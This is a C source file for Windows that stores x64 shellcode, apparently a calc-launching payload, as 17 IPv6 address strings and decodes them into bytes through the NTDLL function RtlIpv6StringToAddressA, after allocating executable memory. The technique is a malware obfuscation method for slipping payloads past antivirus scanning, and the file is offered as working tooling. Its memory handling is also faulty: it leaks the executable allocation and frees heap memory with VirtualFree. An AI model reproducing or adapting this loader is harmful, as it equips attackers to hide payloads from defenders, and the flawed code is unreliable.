#include <Windows.h>
#include <stdio.h>
#include <Ip2string.h>
#pragma comment(lib, "Ntdll.lib")

char* AddressList[] = {
	"FC48:83E4:F0E8:C000:0000:4151:4150:5251", "5648:31D2:6548:8B52:6048:8B52:1848:8B52", "2048:8B72:5048:0FB7:4A4A:4D31:C948:31C0",
	"AC3C:617C:022C:2041:C1C9:0D41:01C1:E2ED", "5241:5148:8B52:208B:423C:4801:D08B:8088", "0000:0048:85C0:7467:4801:D050:8B48:1844",
	"8B40:2049:01D0:E356:48FF:C941:8B34:8848", "01D6:4D31:C948:31C0:AC41:C1C9:0D41:01C1", "38E0:75F1:4C03:4C24:0845:39D1:75D8:5844",
	"8B40:2449:01D0:6641:8B0C:4844:8B40:1C49", "01D0:418B:0488:4801:D041:5841:585E:595A", "4158:4159:415A:4883:EC20:4152:FFE0:5841",
	"595A:488B:12E9:57FF:FFFF:5D48:BA01:0000", "0000:0000:0048:8D8D:0101:0000:41BA:318B", "6F87:FFD5:BBF0:B5A2:5641:BAA6:95BD:9DFF",
	"D548:83C4:283C:067C:0A80:FBE0:7505:BB47", "1372:6F6A:0059:4189:DAFF:D563:616C:6300"
};

#define NumberOfElements 17
#define SizeOfShellcode (NumberOfElements * 16)

typedef NTSTATUS(NTAPI* fnRtlIpv6StringToAddressA)(
	PCSTR			S,
	PCSTR* Terminator,
	PVOID			Addr
	);


BOOL DecodeIPv6Addresses(IN CHAR* AddressList[], IN SIZE_T ElementCount, OUT PBYTE* DecodedOutput, OUT SIZE_T* OutputSize) {
	SIZE_T BufferSize = ElementCount * 16;
	PCSTR EndPointer = NULL;
	NTSTATUS ResultCode = NULL;

	// Retrieve the address conversion function from NTDLL.
	fnRtlIpv6StringToAddressA ConvertAddress = (fnRtlIpv6StringToAddressA)GetProcAddress(GetModuleHandle(TEXT("NTDLL")), "RtlIpv6StringToAddressA");
	if (!ConvertAddress) {
		printf("[!] GetProcAddress Failed: %d \n", GetLastError());
		return FALSE;
	}

	// Allocate memory for the decoded addresses.
	PBYTE Buffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, BufferSize);
	if (!Buffer) {
		printf("[!] HeapAlloc Failed: %d \n", GetLastError());
		return FALSE;
	}

	PBYTE CurrentPosition = Buffer;

	// Process each IPv6 address in the list.
	for (int i = 0; i < ElementCount; i++) {
		if ((ResultCode = ConvertAddress(AddressList[i], &EndPointer, CurrentPosition)) != 0x0) {
			printf("[!] Conversion Failed at [%s]: 0x%0.8X\n", AddressList[i], ResultCode);
			return FALSE;
		}
		CurrentPosition += 16; // Move to the next block in the buffer
	}

	*DecodedOutput = Buffer;
	*OutputSize = BufferSize;
	return TRUE;
}

int main() {
	PBYTE shellcodeBuffer = (PBYTE)VirtualAlloc(NULL, SizeOfShellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellcodeBuffer == NULL) {
		printf("Failed to allocate memory for shellcode.\n");
		return 1;
	}

	SIZE_T decodedSize = 0;
	BOOL result = DecodeIPv6Addresses(AddressList, NumberOfElements, &shellcodeBuffer, &decodedSize);
	if (result) {
		printf("IPv6 deobfuscation decoded successfully. Decoded bytes:\n");
		for (int i = 0; i < decodedSize; i++) {
			printf("%02X ", shellcodeBuffer[i]);
			if ((i + 1) % 16 == 0) {
				printf("\n");
			}
		}
	}
	else {
		printf("Failed to decode IPv6 obfuscation.\n");
	}

	VirtualFree(shellcodeBuffer, 0, MEM_RELEASE);
	return 0;
}
